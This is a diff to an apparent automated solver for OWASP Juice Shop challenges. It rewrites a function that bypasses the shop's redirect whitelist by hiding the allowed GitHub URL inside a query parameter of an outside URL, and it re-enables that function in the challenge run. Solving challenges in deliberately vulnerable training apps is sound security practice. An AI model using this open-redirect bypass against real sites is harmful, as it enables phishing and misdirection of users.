@@ -76,8 +76,8 @@ def bypass_redirect_whitelist(server, session):
     :param server: juice shop URL
     :param session: Session
     """
-    whitelisted = 'https://github.com/bkimminich/juice-shop'
-    bypass = session.get('{}/redirect?to=https://google.com/?{}'.format(server, whitelisted), verify=False)
+    whitelisted = 'http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop'
+    bypass = session.get('{}/redirect?to={}'.format(server, whitelisted), verify=False)
     if not bypass.ok:
         raise RuntimeError('Error bypassing redirection whitelist.')
 
@@ -200,7 +200,7 @@ def solve_misc_challenges(server):
     session = get_admin_session(server)
     access_score_board(server, session)
     access_administration(server, session)
-    #bypass_redirect_whitelist(server, session)
+    bypass_redirect_whitelist(server, session)
     check_all_language_files(server, session)
     provoke_error(server, session)
     #decrypt_easter_egg(server, session)
